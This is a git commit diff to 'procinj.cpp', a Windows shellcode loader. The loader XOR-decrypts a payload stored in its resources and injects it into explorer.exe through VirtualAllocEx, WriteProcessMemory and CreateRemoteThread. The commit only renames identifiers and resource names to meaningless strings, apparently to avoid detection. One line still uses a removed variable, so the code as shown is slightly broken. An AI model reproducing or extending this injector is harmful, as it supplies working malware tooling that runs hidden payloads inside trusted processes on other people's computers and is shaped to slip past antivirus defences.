f04b8d843d57066cdf30b6b400cf66ae3cc2a726
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-28 05:16:44 -0500

    Update procinj.cpp

--- dummyda/procinj.cpp
+++ dummyda/procinj.cpp
@@ -1,4 +1,3 @@
-
 #include <windows.h>
 #include <stdio.h>
 #include <wincrypt.h>
@@ -6,9 +5,9 @@
 #pragma comment (lib, "user32.lib")
 #include <tlhelp32.h>
 
-void flacuaderes(const char* resName, char** data, DWORD* size) {
+void loadkumres(const char* rssssame, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
+    HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);
 
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
@@ -21,9 +20,9 @@ void flacuaderes(const char* resName, char** data, DWORD* size) {
 
 
 
-void xcesgdecman(char* cod11d, DWORD lenofcod1, unsigned char* ke1su, DWORD k2e3y1en) {
+void daggerman101(char* coddmanku1, DWORD lenofcod1, unsigned char* ke44y5, DWORD k2e3y1en) {
     for (DWORD ma1su = 0; ma1su < lenofcod1; ma1su++) {
-        cod11d[ma1su] ^= ke1su[ma1su % k2e3y1en]; 
+        coddmanku1[ma1su] ^= ke44y5[ma1su % k2e3y1en]; 
     }
 }
 
@@ -31,13 +30,13 @@ void xcesgdecman(char* cod11d, DWORD lenofcod1, unsigned char* ke1su, DWORD k2e3
 int main() {
     Sleep(2000);
     
-    char* AESkey;
-    DWORD AESkeyLen;
-    flacuaderes("AESKEY", &AESkey, &AESkeyLen);
+    char* kkeyakesey;
+    DWORD kkeyakeseyLen;
+    loadkumres("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);
 
-    char* AESCode;
-    DWORD AESCodeLen;
-    flacuaderes("AESCODE", &AESCode, &AESCodeLen);
+    char* kkcode;
+    DWORD kkcodeLen;
+    loadkumres("dhanushcode56", &kkcode, &kkcodeLen);
     
     
     PROCESSENTRY32 pe32;
@@ -45,25 +44,24 @@ int main() {
     pe32.dwSize = sizeof(PROCESSENTRY32);
     
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    
+    const char *procmantar = "explorer.exe";
     Process32First(snapshot, &pe32);
-    const char *tarproces = "explorer.exe";
     while(Process32Next(snapshot, &pe32)) {
-       if (strcmp(pe32.szExeFile, tarproces) == 0){
+       if (strcmp(pe32.szExeFile, procmantar) == 0){
               HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
               
-              LPVOID mellsloo = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+              LPVOID clamonua = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
               //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
-              xcesgdecman(AESCode, AESCodeLen, AESkey , AESkeyLen);
+              daggerman101(kkcode, kkcodeLen, kkeyakesey , kkeyakeseyLen);
              
-              WriteProcessMemory(hProcess, mellsloo, AESCode, AESCodeLen, NULL);
+              WriteProcessMemory(hProcess, clamonua, kkcode, kkcodeLen, NULL);
              
              
 
-             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)mellsloo, NULL, 0, NULL);
+             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)clamonua, NULL, 0, NULL);
              WaitForSingleObject(tHandle, INFINITE);
              
-              VirtualFreeEx(hProcess, mellsloo, 0, MEM_RELEASE);
+              VirtualFreeEx(hProcess, clamonua, 0, MEM_RELEASE);
            
               CloseHandle(tHandle);
            
